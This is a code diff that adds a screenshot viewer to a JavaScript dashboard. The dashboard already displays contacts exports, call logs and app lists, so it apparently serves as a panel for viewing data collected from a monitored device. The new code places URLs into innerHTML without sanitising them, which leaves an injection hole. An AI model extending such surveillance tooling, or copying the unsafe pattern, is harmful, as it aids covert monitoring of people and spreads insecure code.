@@ -645,6 +645,12 @@ if (p.includes("=== Contacts Export")) {
     if (keys.includes('duration') || keys.includes('type')) {
       renderCalls(obj); return;
     }
+	
+	if (keys.includes("screenshots") || keys.includes("supabase.co")) {
+		renderScreenshots(obj);
+		return;
+	}
+
 
     // default fallback
     renderApps(obj);
@@ -658,6 +664,41 @@ if (p.includes("=== Contacts Export")) {
 
   pushLog("📥 Received: " + String(obj));
 }
+
+
+
+	function renderScreenshots(arr) {
+  screenshotsContainer.innerHTML = "";
+
+  if (!arr || arr.length === 0) {
+    screenshotsContainer.innerHTML = "<p>No screenshots found.</p>";
+    return;
+  }
+
+  arr.forEach((url, i) => {
+    // Handle object: { url: "https://..." }
+    let imgUrl = typeof url === "string" ? url : url.url;
+
+    const div = document.createElement("div");
+    div.style.marginBottom = "15px";
+
+    div.innerHTML = `
+      <div style="font-size:13px;color:#9cb3c7;margin-bottom:5px;">
+        Screenshot ${i + 1}
+      </div>
+
+      <img 
+        src="${imgUrl}" 
+        style="width:100%;max-width:400px;border:1px solid #444;border-radius:6px;"
+        onerror="this.style.display='none'; this.insertAdjacentHTML('afterend', '<p style=color:red>Failed to load image</p>');"
+      />
+    `;
+
+    screenshotsContainer.appendChild(div);
+  });
+}
+
+	
 
 
    function renderApps(arr) {
